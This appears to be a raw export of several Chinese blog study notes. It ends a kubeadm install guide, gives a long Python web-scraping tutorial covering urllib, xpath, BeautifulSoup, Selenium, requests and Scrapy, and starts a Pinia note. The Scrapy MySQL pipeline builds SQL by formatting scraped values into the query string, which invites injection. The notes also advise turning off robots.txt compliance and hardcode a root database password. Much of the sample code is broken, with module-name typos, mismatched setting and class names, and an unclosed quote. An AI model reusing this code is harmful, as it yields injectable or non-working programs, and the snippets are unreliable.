Ingress：对外接口（定义pod的访问规则）\nRBAC：安全机制，权限管理\nHelm：包管理器，快速下载，安装软件\nk8s集群搭建\n单master集群：单个master节点，管理多个node节点\n多master集群（高可用集群）：多个master节点，管理多个node节点，中间存在着负载均衡的过程\nkubeadm\nkubeadm是k8s部署工具，用于快速部署k8s集群\n官方文档：https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/install-kubeadm/\nkubeadm安装\n安装必备软件\napt install -y apt-transport-https ca-certificates curl\n添加k8s国内源\nsudo tee /etc/apt/sources.list.d/kubernetes.list \u0026laquo;-\u0026lsquo;EOF\u0026rsquo; deb https://mirrors.tencent.com/kubernetes/apt/ kubernetes-xenial main EOF\n添加签名\ngpg \u0026ndash;keyserver keyserver.ubuntu.com \u0026ndash;recv-keys 836F4BEB gpg \u0026ndash;export \u0026ndash;armor 836F4BEB | sudo apt-key add - apt update\n836F4BEB这个为NO_PUBKEY的后8位\n安装三件套\napt install -y kubelet kubeadm kubectl","title":"Kubernetes学习笔记"},{"content":"urllib，xpath，jsonpath，beautiful，requests，selenium，Scrapy\npython库内置的HTTP请求库 urllib.request 请求模块 urllib.error 异常处理模块 urllib.parse url解析模块 urllib.robotparsef robots.txt解析模块\nurllib.request提供了最基本的http请求方法，主要带有处理授权验证，重定向，浏览器Cookies功能\n模拟浏览器发送get请求，就需要使用request对象，在该对象添加http头 import urllib.requst response = urllib.request.urlopen(\u0026lsquo;https://xiaochenabc123.test.com/') print(response.read().decode(\u0026lsquo;utf-8\u0026rsquo;))\n使用type()方法 import urllib.requst response = urllib.request.urlopen(\u0026lsquo;https://xiaochenabc123.test.com/') print(type(response))\nHTTPResposne类型对象\n通过status属性获取返回的状态码 import urllib.requst response = urllib.request.urlopen(\u0026lsquo;https://xiaochenabc123.test.com/') print(response.status) print(response.getheaders())\npost发送一个请求，只需要把参数data以bytes类型传入 import urllib.parse import urllib.request data = bytes(urllib.parse.urlencode({\u0026lsquo;hallo\u0026rsquo;:\u0026lsquo;python\u0026rsquo;}),encoding=\u0026lsquo;utf-8\u0026rsquo;) response = urllib.request.urlopen(\u0026lsquo;http://httpbin.org/post'.data = data) print(response.read())\ntimeout参数用于设置超时时间，单位为秒 import urllib.request response = urllib.request.urlopen(\u0026lsquo;https://xiaochenabc123.test.com/',timeout=1)\n这里设置超时时间为1秒，如果超了1秒，服务器依然没有响应就抛出URLError异常，可以结合try和except\nimport urllib.parse\rimport urllib.request\rurl = \u0026quot;https://xiaochenabc123.test.com/\u0026quot;\rheaders = {\r'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62'}\rdata = urllib.request.Request(url=url, headers=headers)\rhi = hallo = urllib.request.urlopen(data)\r#hallo = urllib.request.urlopen(data).read().decode('utf-8')\r#print(hallo)\r# 6个方法\r#abc = hi.read(6) #按字节返回\r#xyz = hi.readline() # 读取一行\r#a = hi.readlines() # 一行一行的读取\r#b = hi.getcode() # 状态码\r#c = hi.geturl() # 获取url地址\r#d = hi.getheaders() # 获取状态信息\r# 下载到本地\r#urllib.request.urlretrieve(url,data.html)\r#url_img = \u0026quot;https://xiaochenabc123.test.com/1.jpg\u0026quot;\r#urllib.request.urlretrieve(url_img,abc.jpg)\r#url_mp4 = \u0026quot;https://xiaochenabc123.test.com/1.mp4\u0026quot;\r#urllib.request.urlretrieve(url_img,xyz.mp4)\r# auote() 转Unicode编码\r#name = urllib.parse.quote(\u0026quot;哈哈哈\u0026quot;)\r#urlencode(),get拼接\rgg = {\r\u0026quot;name\u0026quot;: \u0026quot;小陈\u0026quot;,\r\u0026quot;data\u0026quot;: \u0026quot;hallo word\u0026quot;\r}\rhaha = urllib.parse.urlencode(gg)\r#print(haha)\r# post请求\rssr = {\rdata: \u0026quot;abc\u0026quot;\r}\rabcxyz = urllib.parse.urlencode(ssr).encode('utf‐8')\rnogo = urllib.request.Request(url=url, headers=headers, data=abcxyz)\ryesgo = urllib.request.urlopen(nogo)\r#print(yesgo.read().decode('utf‐8'))\r#ajax请求（get和post）\r#cookie（扩展headers）\rheaders = {\r'Cookie': 'xxxx'\r}\r#HTTPHandler()\r#request = urllib.request.Request(url=url, headers=headers) #handler = urllib.request.HTTPHandler()\r#opener = urllib.request.build_opener(handler) #response = opener.open(request) #print(response.read().decode('utf‐8'))\r#代理服务器\rurls = \u0026quot;http://baidu.com\u0026quot;\rrequest = urllib.request.Request(url=urls, headers=headers)\rproxies = {'https': '14.115.106.223:808'}\rhandler = urllib.request.ProxyHandler(proxies=proxies) opener = urllib.request.build_opener(handler) response = opener.open(request) content = response.read().decode('utf‐8')\r#print(content)\rfrom lxml import etree\rimport urllib.request\r# 解析本地文件\r#html_data = etree.parse('./hallo.html', etree.HTMLParser())\r# 解析服务器响应文件\r# html = etree.HTML(response.read().decode('utf‐8')\r#result = etree.tostring(html_data)\r# print(result.decode('utf-8'))\r# /为查找子节点，//为查找全部子孙节点（不考虑层级）\r# list = html_data.xpath(\u0026quot;//ul/li\u0026quot;)\r# 查找全部带id\r# list = html_data.xpath(\u0026quot;//ul/li[@id]/text()\u0026quot;)\r# 查找指定id\r# list = html_data.xpath('//ul/li[@id=\u0026quot;a\u0026quot;]/text()')\r# 查找指定class的\r# list = html_data.xpath('//ul/li[@class=\u0026quot;a\u0026quot;]/text()')\r# 模糊查询（包含）\r# list = html_data.xpath('//ul/li[contains(@id, \u0026quot;ab\u0026quot;)]/text()')\r# 查找以什么开头的\r# list = html_data.xpath('//li[starts-with(@id, \u0026quot;a\u0026quot;)]/text()')\r# 查找以什么结尾的\r# list = html_data.xpath('//li[ends-with(@id, \u0026quot;a\u0026quot;)]/text()')\r# 查找内容\r# list = html_data.xpath('//a[text()=\u0026quot;小陈的辣鸡屋\u0026quot;]/text()')\r# 多属性匹配(和)\r# list = html_data.xpath('//li[contains(@id, \u0026quot;a\u0026quot;) and @href=\u0026quot;https://xiaochenabc123.test.com\u0026quot;]/a/text()')\r# 或者\r# list = html_data.xpath('//li[contains(@id, \u0026quot;a\u0026quot;) | @href=\u0026quot;https://xiaochenabc123.test.com\u0026quot;]/a/text()')\r# 查找指定顺序的\r# list = html_data.xpath('//a[1]/text()') #获取第一个，可以指定第几个\r# list = html_data.xpath('//a[last()]/text()') #获取最后一个\r# list = html_data.xpath('//a[position()\u0026lt;6]/text()') # 获取前5个\r# list = html_data.xpath('//a[last()-3]/text()') #获取倒数第4个\r# print(list)\r#实例：获取logo和logo的url\r#url = \u0026quot;https://xiaochenabc123.test.com\u0026quot;\r#headers = {\r# 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62'\r#}\r#request = urllib.request.Request(url=url, headers=headers)\r#response = urllib.request.urlopen(request)\r#content = response.read().decode(\u0026quot;utf-8\u0026quot;)\r#hallo = etree.HTML(content)\r#data = hallo.xpath('//h3[@id=\u0026quot;logo\u0026quot;]/a/@href')[0]\r#data1 = hallo.xpath('//h3[@id=\u0026quot;logo\u0026quot;]/a/text()')[0]\r#print(data,data1)\r#获取文章的标题\r#headers = {\r# 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62'\r#}\r#\r#if __name__ == \u0026quot;__main__\u0026quot;:\r# page1 = int(input(\u0026quot;开始\u0026quot;))\r# page2 = int(input(\u0026quot;结束\u0026quot;))\r#\r# for page in range(page1, page2 + 1):\r# urldata = \u0026quot;https://xiaochenabc123.test.com/archives/\u0026quot; + str(page) + \u0026quot;.html\u0026quot;\r# #print(urldata)\r# request = urllib.request.Request(url=urldata, headers=headers)\r# response = urllib.request.urlopen(request)\r# if (response.getcode() == 200):\r# content = response.read().decode(\u0026quot;utf-8\u0026quot;)\r# hallo = etree.HTML(content)\r# data = hallo.xpath('//h3[@class=\u0026quot;post-title\u0026quot;]/a/text()')[0]\r# print(data)\r# elif(response.getcode() == 404):\r# continue\r#爬取网站的全部a链接，并且返回到数组中\r#if __name__ == \u0026quot;__main__\u0026quot;:\r# url = input(\u0026quot;请输入要爬取的url\u0026quot;)\r# abc = int(input(\u0026quot;是否启动只搜索当前域名的url,请回复0或者1\u0026quot;))\r# headers = {\r# 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62'\r# }\r# request = urllib.request.Request(url=url, headers=headers)\r# response = urllib.request.urlopen(request)\r# content = response.read().decode(\u0026quot;utf-8\u0026quot;)\r# hallo = etree.HTML(content)\r# data = hallo.xpath('//a/@href')\r# a = 1\r# b = 1\r# c = \u0026quot;https\u0026quot;\r# d = \u0026quot;http\u0026quot;\r# if (abc == 1):\r# while a \u0026lt; len(data):\r# if (c or d in data[a]):\r# if (url in data[a]):\r# urldata = data[a]\r# print(urldata)\r# a += 1\r# else:\r# while b \u0026lt; len(data):\r# if (c or d in data[a]):\r# urldata = data[b]\r# print(urldata)\r# b += 1\r练习（json解析bing官方提供的api，获取精密壁纸）\nimport jsonpath\rimport json\rimport urllib.request\r# pip install jsonpath\rheaders = {\r'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62'\r}\rabc = 0\rwhile abc == 0 :\ra = int(input(\u0026quot;请输入要下载的张数（bing最多只能下载8张）\u0026quot;))\raa = str(a)\rif(a\u0026lt;=8):\rurlapi = \u0026quot;https://cn.bing.com/HPImageArchive.aspx?format=js\u0026amp;idx=0\u0026amp;n=\u0026quot;+aa+\u0026quot;\u0026amp;mkt=zh-CN\u0026quot;\rrequest = urllib.request.Request(url=urlapi, headers=headers)\rresp = urllib.request.urlopen(request)\rcontent = resp.read().decode(\u0026quot;utf-8\u0026quot;)\rwith open(\u0026quot;data.json\u0026quot;, \u0026quot;w\u0026quot;, encoding=\u0026quot;utf-8\u0026quot;) as fp:\rfp.write(content)\robj = json.load(open(\u0026quot;data.json\u0026quot;, \u0026quot;r\u0026quot;, encoding=\u0026quot;utf-8\u0026quot;))\rhallo = jsonpath.jsonpath(obj, \u0026quot;$..url\u0026quot;)\rimg = jsonpath.jsonpath(obj, \u0026quot;$..enddate\u0026quot;)\rc = 0\rb = 0\rwhile c \u0026lt; len(hallo):\rhi = \u0026quot;https://cn.bing.com\u0026quot;\rdata = hi + hallo[c]\rprint(data)\rc+=1\rwhile b \u0026lt; len(img):\rhaha = img[b] + \u0026quot;.jpg\u0026quot;\rprint(haha)\rurllib.request.urlretrieve(data, filename=haha)\rb+=1\rbreak\rprint(\u0026quot;下载完成！！！\u0026quot;)\rabc = 1\relse:\rprint(\u0026quot;您输入的张数超过8张，bing官方api只能下载8张，请重新输入\u0026quot;)\rBeautiful Soup解析库，和lxml一样，可以从html或者xml中解析数据和提取数据，Beautiful Soup会自动将输入数据转换为unicode编码，输出数据转换为utf-8编码。不需要考虑编码问题。除非文档没有说明编码\n目前使用的是Beautiful Soup 4，简称bs4，Beautiful Soup3已停止维护\n安装\npip install beautifulsoup4\n注意：Beautiful Soup支持第三方解析器，如果不使用第三方解析器的话，将使用Python标准库中的html解析器\nBeautifulSoup(html, html.parser) # 内置标准库\rBeautifulSoup(html, lxml) # lxml库，需要下载lxml库\rBeautifulSoup(html, xml) # lxml的xml解析，需要下载lxml库\rBeautifulSoup(html, html5lib) # html5lib，需要下载html5lib库 pip install html5lib\r第一个例子\nfrom bs4 import BeautifulSoup\r# data = BeautifulSoup(open(\u0026quot;haha.html\u0026quot;),encoding=\u0026quot;utf-8\u0026quot;, \u0026quot;lxml\u0026quot;)\rdata = BeautifulSoup(open(\u0026quot;haha.html\u0026quot;))\rprint(data.prettify())\rbs会将html文档解析为树状结构，该树状结构的节点是Python对象，而这些对象可以分为4种：\nTag：标签，通过tag获取指定标签内容，print(data.div)，可以通过data.标签名的方式获取标签的内容（注意：输出第一个符合条件的标签）\n检查对象的类型：print (type(data.div))，可以看到输出结果为\u0026lt;class \u0026lsquo;bs4.element.Tag\u0026rsquo;\u0026gt;，说明该对象为tag\ntag有两个属性，分别为name和attrs\nprint (data.name)\rprint (data.div.name)\r可以看到输出结果为[document]和div，data的name为[document]，而标签输出为标签本身的名字\nprint (data.div.attrs)\r可以看到输出结果是{\u0026lsquo;class\u0026rsquo;: [\u0026lsquo;xxx\u0026rsquo;]}的键值对，可以通过data.div[\u0026ldquo;xxx\u0026rdquo;]方式获取属性值，也可以修改属性值（data.div[\u0026ldquo;class\u0026rdquo;]= \u0026ldquo;nav\u0026rdquo;），删除属性（del data.div[\u0026ldquo;class\u0026rdquo;]）\nNavigableString：标签内部的文本（.string），print (data.p.string)，判断类型，print (type(data.p.string))，输出结果为\u0026lt;class \u0026lsquo;bs4.element.NavigableString\u0026rsquo;\u0026gt;\nBeautifulSoup：文档的全部内容，也就是data本身，print (type(data))，\u0026lt;class \u0026lsquo;bs4.BeautifulSoup\u0026rsquo;\u0026gt;\nComment：特殊一点的NavigableString类型，可以输出注释的内容（不带注释符号），通过类型判断print (type(data.span.string))，可以看到输出\u0026lt;class \u0026lsquo;bs4.element.Comment\u0026rsquo;\u0026gt;\n查找\nprint(data.div.content) # 查找div的全部子节点，并且以列表的方式输出，可以使用索引来指定获取第几个节点\rprint(data.div.children) #一样是查找div的全部子节点，不过是list生成器，需要手动遍历获取\rprint(data.select(\u0026quot;span\u0026quot;)) #查找标签，也可以通过类名或者id名查找，支持组合查找（和css方式一样）\rprint(data.find(\u0026quot;div\u0026quot;))\rprint(data.find(\u0026quot;div\u0026quot;,class_=\u0026quot;nav\u0026quot;))\rselenium是一个web应用自动化测试工具，selenium可以直接运行在目前主流浏览器驱动（本身没有浏览器功能，需要搭配第三方浏览器，支持无界面浏览器），模拟用户操作\n因为其自动化和可以直接运行在浏览器的原因，可以用于爬虫\nchromedriver：https://npm.taobao.org/mirrors/chromedriver（淘宝镜像地址，下载的驱动版本要和浏览器内核的版本一样） edge: https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/ （webdriver.Edge()） 火狐：https://github.com/mozilla/geckodriver/releases （webdriver.Firefox()）\n安装\npip install selenium\n导入驱动\nfrom selenium import webdriver\rpath = \u0026quot;浏览器驱动路径\u0026quot;\rdriver = webdriver.Chrome(path)\rurl = \u0026quot;https://xiaochenabc123.test.com\u0026quot;\rdriver.get(url)\rdata = driver.page_source\rprint(data)\r元素定位（模拟鼠标和键盘操作元素的点击或者输入等等，在操作元素之前需要获取到元素的位置）\n注意：element是返回单个对象，elements可以返回多个对象\n根据id查找元素\ndata = driver.find_element_by_id(\u0026ldquo;app\u0026rdquo;)\n根据name属性值查找 data = driver.find_element_by_name(\u0026quot;\u0026quot;)\n根据xpath查找 data = driver.find_elements_by_xpath()\n根据标签名查找 data = driver.find_elements_by_tag_name()\n使用bs4的方式查找 data = driver.find_element_by_css_selector(\u0026quot;#app\u0026quot;)\n根据连接的文本查找 data = driver.find_element_by_link_text()\n根据连接的文本查找（模糊） data = driver.find_element_by_partial_link_text()\n根据class名查找 data = driver.find_element_by_class_name()\n交互和数据获取\n数据获取\n获取属性值\nprint(data.get_attribute(\u0026ldquo;href\u0026rdquo;))\n获取标签名\nprint(data.tag_name)\n获取元素文本\nprint(data.text)\n交互\n指定浏览器大小\ndriver.set_window_size(900, 1000)\n浏览器的前进和后退，以及刷新\ndriver.forward() driver.back() driver.refresh()\ninput输入框操作\ndata.click() #单击元素 data.send_keys(\u0026ldquo;hallo\u0026rdquo;) #输入 data.clear() #清除内容\n执行指定js脚本\ndriver.execute_script(js)\n例如：\nimport time\rfrom selenium import webdriver\rpath = \u0026quot;msedgedriver.exe\u0026quot;\rdriver = webdriver.Edge(path)\rurl = \u0026quot;https://www.baidu.com/\u0026quot;\rdriver.get(url)\rdata = driver.page_source\rdatas = driver.find_element_by_id(\u0026quot;kw\u0026quot;)\rdatas.send_keys(\u0026quot;小陈的辣鸡屋\u0026quot;)\ra = driver.find_element_by_id(\u0026quot;su\u0026quot;)\ra.click()\rtime.sleep(2)\r#bottom = 'document.documentElement.scrollTop=10000'\r#driver.execute_script(bottom)\rb = driver.find_element_by_link_text(\u0026quot;小陈的辣鸡屋\u0026quot;)\rb.click()\rPhantomjs是一个无界面浏览器，因为其不需要进行gui渲染，效率比较高，但是已经停止更新，这里只了解一下，推荐使用Headless Chrome\nhttps://phantomjs.org/\nphantomjs操作方式一样\ndriver = webdriver.PhantomJS(path)\r因为没有界面，访问网页是没有界面的，需要通过快照获取，driver.save_screenshot(\u0026ldquo;xiaochenabc123.test.com.jpg\u0026rdquo;)\nHeadless Chrome是基于Chrome 59版本以及以上版本的无界面模式（mac和Linux最低要求59版本，而win需要60版本）\nfrom selenium import webdriver\rfrom selenium.webdriver.chrome.options import Options\rchrome_options = Options()\rchrome_options.add_argument('--headless') # 无界面模式启动\rchrome_options.add_argument('--disable-gpu')\rpath = \u0026quot;Chrome.exe\u0026quot; # Chrome浏览器的路径\rchrome_options.binary_location = path\rdriver = webdriver.Chrome(chrome_options=chrome_options) # 实例化\rurl = \u0026quot;https://xiaochenabc123.test.com\u0026quot;\rdriver.get(\u0026quot;url\u0026quot;)\rdriver.save_screenshot(\u0026quot;xiaochenabc123.test.com.jpg\u0026quot;)\r具体操作方法和selenium一样\nrequests库是基于Python开发并且封装的http库，HTTP for Humans\n安装\npip install requests\n使用方式很简单\nimport requests\rurl = \u0026quot;https://xiaochenabc123.test.com\u0026quot;\rresponse = requests.get(url)\rresponse.status_code # 200 返回状态码\rprint(type(response)) # 返回类型\rresponse.encoding = \u0026quot;utf-8\u0026quot; # 响应的编码\rprint(response.text) # 返回源代码\rprint(response.url) # 返回请求的url\rprint(response.content) # 返回二进制数据\rprint(response.headers) # 返回响应头\rrequests在请求json的时候还可以直接获取\nget请求\nget请求的参数通过params属性传递，不需要考虑url的编码问题，不需要考虑请求对象，例如：\ndata = {\r'wd': 'python'\r}\rheaders = {\r'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62'\r}\rresponse = requests.get('https://baidu.com/s?', params=data, headers=headers)\rprint (response.text)\rpost请求\npost请求不需要考虑编解码，不需要考虑请求对象\ndata = {\r'url': 'xiaochenabc123.test.com',\r'name': 'root'\r}\rurl = \u0026quot;https://httpbin.org/post\u0026quot;\rresponse = requests.post(url=url, data=data, headers=headers)\rimport json\robj = json.loads(response.text,encoding=\u0026quot;utf-8\u0026quot;)\rprint (obj)\r注意：默认使用application/x-www-form-urlencoded进行编码，如果想传递json，需要使用requests.post()的json参数，上传文件用files参数\n另外还支持put()和delete()\n传入cookie需要cookies参数，支持设置请求超时（timeout参数，单位为秒）\n代理用proxies参数，指向一个字典（代理池）\nscrapy是基于Python开发的爬取数据，提取数据的框架，可应用在数据挖掘，数据存储\n安装\npip install scrapy\nscrapy架构组件分为Scrapy Engine（引擎），Scheduler（调度器），Downloader（下载器），Spider（爬虫），Item Pipeline（数据管道），Downloader middlewares（下载中间件），Spider middlewares（Spider中间件）\nScrapy Engine：负责控制数据流（Data Flow）在组件中的流动，例如通信，数据传递，在某些情况下还触发相对应的事件\nScheduler：负责接收引擎发送的request请求并且将其存储在调度器中，当引擎需要时提供给引擎，调度器会自动去重url（也可以不去重）\nDownloader：负责下载引擎发送的全部request请求的响应数据，将获取到数据提供给Spider\nSpider：负责处理全部响应数据，并且进行分析提取数据，获取需要的数据，并且将需要进行额外跟进的url传递给引擎，以便重新进入调度器，一般情况一个Spider只负责一个或者多个特定的url\nItem Pipeline：负责处理Spider提取出来的数据，经过分析，过滤，存储等步骤，最后存储在本地或者数据库中\nDownloader middlewares：其是引擎和Downloader之间的钩子，自定义扩展下载器的功能，例如更换ua，ip等等\nSpider middlewares：Spider和引擎之间的钩子，用来处理Spider的输入响应和输出数据，自定义扩展Spider的功能\n具体数据流线路：引擎请求一个url，并且获取到处理这个url的Spider，并且向该Spider请求要第一个爬取的url，引擎获取到要爬取的url，将其传递给调度器，引擎再向调度器请求要下一个爬取的URL，调度器返回url给引擎，引擎通过下载中间件传递给下载器，由下载器下载数据，当数据下载完毕（不管是否成功），下载器将响应数据通过下载中间件返回给引擎，引擎得到数据并且通过Spider中间件传递给Spider处理数据，Spider处理数据并且将处理完毕的数据以及需要跟进的url提供给引擎，引擎再将处理完毕的数据传递给Item Pipeline进行下一步处理，并且将需要跟进的url传递给调度器，一直重复循环直到调度器中没有request\n新建项目：\nscrapy startproject scrapyDemo\n这个项目中包含了一些文件，分别是scrapy.cfg（配置文件），scrapyDemo/（项目的Python模块，将在这里编写程序），items.py（item文件，目标文件），pipelines.py（管道文件，用来处理数据，默认为300优先级，值越小优先级越高），settings.py（项目的设置文件，例如robots协议是否遵守，定义ua等等），spiders/（spider爬虫程序存放的目录）\nspider爬虫程序（/spiders目录下）\n创建一个爬虫必须继承scrapy.Spider类，并且定义三个参数（必须唯一，用来区别其他爬虫），start_urls（爬虫程序执行时要爬取的url），parse()在被调用时，下载完成后得到的响应将作为唯一参数传递给该方法，这个方法负责解析返回回来的数据，以及提取数据和后续要进行下一步处理的响应数据\n快速创建一个基础scrapy爬虫程序\nscrapy genspider cjlio xiaochenabc123.test.com\nimport scrapy\rclass CjlioSpider(scrapy.Spider):\rname = 'cjlio'\rallowed_domains = ['xiaochenabc123.test.com'] # 过滤爬取的URL，不在此范围内的域名会被过滤掉\rstart_urls = ['http://xiaochenabc123.test.com/']\rdef parse(self, response):\rcontent = response.text\rprint(content)\rresponse属性：.text（返回响应的字符串），.body（返回二进制数据），.xpath()（使用xpath方法来解析，返回的数据为列表），.extract()获取seletor对象的data属性值，.extract_first()获取seletor列表的第一个的数据\n还有.url（url地址），.status（状态码），.encoding（响应正文的编码），.request（生成request对象），.css()（用css选择器方式解析数据），.urljoin()（生成绝对url）\n执行爬虫程序（cjlio为爬虫的name）\nscrapy crawl cjlio\n将获取的数据存储为json文件\nscrapy crawl cjlio -o cjlio.json\n注意：因为scrapy默认使用ascii存储json，需要改为utf-8\n在settings.py中添加FEED_EXPORT_ENCODING = \u0026lsquo;utf-8\u0026rsquo;解决\n关闭robots协议（不遵守robots协议，注释掉或者改为False，默认遵守robots协议）\nROBOTSTXT_OBEY = False\rscrapy shell是一个交互终端，在没有启动spider的情况下尝试以及测试程序的xpath和css表达式\nscrapy shell可以借助ipython终端\npip install ipython\n注意：如果安装ipython，scrapy将使用ipython代替Python标准终端，ipython提供了自动补全，高亮等等功能\n调试例子（不需要进入Python环境，可以直接在终端中调试）\nscrapy shell xiaochenabc123.test.com\nresponse.text\nresponse.xpath()\nitems.py定义数据结构\nimport scrapy\rclass ScrapydemoItem(scrapy.Item):\rname = scrapy.Field()\rimg = scrapy.Field()\rcjlio.py（爬虫程序）\nimport scrapy\rclass CjlioSpider(scrapy.Spider):\rname = 'cjlio'\rallowed_domains = ['xiaochenabc123.test.com']\rstart_urls = ['http://xiaochenabc123.test.com/']\rdef parse(self, response):\rcontent = response.text\rname = content.xpath(\u0026quot;xpath匹配\u0026quot;).extract_first()\rimg = content.xpath(\u0026quot;xpath匹配\u0026quot;).extract_first()\rprint(name, img)\r管道封装\ncjlio.py（爬虫程序）\nfrom scrapyDemo.items import ScrapydemoItem\r...\rdata = scrapyDemoItems(name=name,img=img)\ryield data # 每获取一次data数据，就是返回一次数据给管道\r# yield的作用类似于生成器（generator）\r注意：如果想使用管道，需要在settings.py中开启\n找到\nITEM_PIPELINES = {\r'scrapyDemo.pipelines.ScrapydemoPipeline': 300,\r}\r将注释去掉，300指优先级（优先级1到1000），值越小优先级越高\npipelines.py（管道文件）中的item就是爬虫程序返回的data数据\n启动爬虫之前（open_spider(self, spider)）\n启动爬虫之后（close_spider(self, spider)）\n开启多管道\n在 ITEM_PIPELINES 字段中添加新管道（settings.py）\n然后在pipelines.py定义新管道的类\n查询当前项目中的爬虫任务：scrapy list\n自定义UA\nsettings.py文件中USER_AGENT字段或者DEFAULT_REQUEST_HEADERS都可以\n项目中配置headers\nspiders爬虫程序\nheaders = {\r'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62'\r}\rurl = \u0026quot;https://xiaochenabc123.test.com\u0026quot;\ryield scrapy.Request(\rurl=url,\rheaders=headers\r)\r数据入库\n安装pymysql\npip install pymysql\nsettings.py\n（pymysql） DB_HOST = \u0026ldquo;127.0.0.1\u0026rdquo; DB_RORT = 3306 DB_USER = \u0026ldquo;root\u0026rdquo; DB_PASSWORD = \u0026ldquo;123abc\u0026rdquo; DB_NAME = \u0026ldquo;dataMax\u0026rdquo; DB_CHARSET = \u0026ldquo;utf8\u0026rdquo;\n开一条新管道，专门处理数据入数据库\npipeline.py\nfrom scrapy.utils.project import get_project_settings\rimport pymysql\r#读取settings文件\rclass MysqlMax:\rdef open_spider(self, spider):\rsettings = get_project_settings()\rself.host = settings['DB_HOST']\rself.port = settings['DB_PORT']\rself.user = settings['DB_USER']\rself.password = settings['DB_PASSWORD']\rself.name = settings['DB_NAME']\rself.charset = settings['DB_CHARSET']\rself.connect()\rdef connect(self):\rself.conn = pymysql.connect(\rhost = self.host,\rport = self.port,\ruser = self.user,\rpassword = self.password,\rname = self.name,\rcharset = self.charset\r)\rself.cursor = self.conn.cursor()\rdef process_item(self,item,spider):\rsql = 'insert into book(name,src) values(\u0026quot;{}\u0026quot;,\u0026quot;{}\u0026quot;).format(item['name'],item['img'])\rself.cursor.execute(sql)\rself.conn.commit()\r# 执行sql语句，并且提交\rreturn item\rdef close_spider(self, spider):\rself.cursor.close()\rself.conn.close()\r链接跟进和链接提取器\n爬虫程序文件\nrules = (\rRule(LinkExtractor(allow = \u0026quot;\u0026quot;),\rcallback = \u0026quot;parse_item\u0026quot;, follow = True),\r)\rallow为正则表达式，当链接满足正则表达式提取，为空则全部匹配（链接提取器）\ncallback为指定解析数据的规则\nfollow一般情况默认为False，指定是否从response提取的链接进行跟进，当callback为none时，follow为True\n还有dent =()，用来过滤符合正则表达式的链接，当符合时不提取\nallow_domains：允许的域名，deny_domains：不允许的域名\nrestrict_xpaths：提取符合xpath的链接，restrict_css：提取符合选择器的链接\n注意：follow当为True会一直提取符合规则的链接，直到全部链接提取完毕\n日志以及日志等级\n日志等级\nCRITICAL：严重错误 ERROR：一般错误 WARNING：警告 INFO：一般信息 DEBUG：调试信息（默认，只有出现DEBUG以及以上等级的日志才会打印输出）\nsettings.py文件可以设置哪些日志显示，哪些不显示\nLOG_FILE：将信息存储到文件中，不显示在输出界面，后缀为.log\nLOG_LEVEL：指定日志显示的等级\n例如： LOG_LEVEL = \u0026ldquo;WARNING\u0026rdquo; LOG_FILE= \u0026ldquo;demo.log\u0026rdquo;\n","permalink":"https://99999.fun/posts/125/","summary":"urllib，xpath，jsonpath，beautiful，requests，selenium，Scrapy\npython库内置的HTTP请求库 urllib.request 请求模块 urllib.error 异常处理模块 urllib.parse url解析模块 urllib.robotparsef robots.txt解析模块\nurllib.request提供了最基本的http请求方法，主要带有处理授权验证，重定向，浏览器Cookies功能\n模拟浏览器发送get请求，就需要使用request对象，在该对象添加http头 import urllib.requst response = urllib.request.urlopen(\u0026lsquo;https://xiaochenabc123.test.com/') print(response.read().decode(\u0026lsquo;utf-8\u0026rsquo;))\n使用type()方法 import urllib.requst response = urllib.request.urlopen(\u0026lsquo;https://xiaochenabc123.test.com/') print(type(response))\nHTTPResposne类型对象\n通过status属性获取返回的状态码 import urllib.requst response = urllib.request.urlopen(\u0026lsquo;https://xiaochenabc123.test.com/') print(response.status) print(response.getheaders())\npost发送一个请求，只需要把参数data以bytes类型传入 import urllib.parse import urllib.request data = bytes(urllib.parse.urlencode({\u0026lsquo;hallo\u0026rsquo;:\u0026lsquo;python\u0026rsquo;}),encoding=\u0026lsquo;utf-8\u0026rsquo;) response = urllib.request.urlopen(\u0026lsquo;http://httpbin.org/post'.data = data) print(response.read())\ntimeout参数用于设置超时时间，单位为秒 import urllib.request response = urllib.request.urlopen(\u0026lsquo;https://xiaochenabc123.test.com/',timeout=1)\n这里设置超时时间为1秒，如果超了1秒，服务器依然没有响应就抛出URLError异常，可以结合try和except\nimport urllib.parse\rimport urllib.request\rurl = \u0026quot;https://xiaochenabc123.test.com/\u0026quot;\rheaders = {\r'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.","title":"python爬虫学习笔记"},{"content":"Pinia是vuejs的轻量级状态管理库，Pinia支持Vue devtools浏览器扩展工具，可扩展，模块化设计，热模块更新，轻量级，支持TypeScript，支持SSR服务器端渲染，支持vue2，vue3\nPinia作者也是vuex核心之一\n安装pinia\nnpm install pinia@next\n或者\nyarn add pinia@next\n导入pinia并且挂载为vue插件(在Vite脚手架下)\nsrc/main.js\nimport { createApp } from 'vue'\rimport App from './App.vue'\rconst app = createApp(App)\rimport { createPinia } from 'pinia'\rapp.use(createPinia())\rapp.mount('#app')\rsrc/stores/main.js（pinia通过defineStore函数来创建state，并且接收一个id来标识state）\nimport { defineStore } from 'pinia'\rexport const useDataStore = defineStore('data', {\rstate: () =\u0026gt; {\rreturn { count: 666 }\r},\r//state: () =\u0026gt; {\r//name: chen\r//},\rgetters:{ // getters计算属性\rdoubleCount(state){\rreturn state.count * 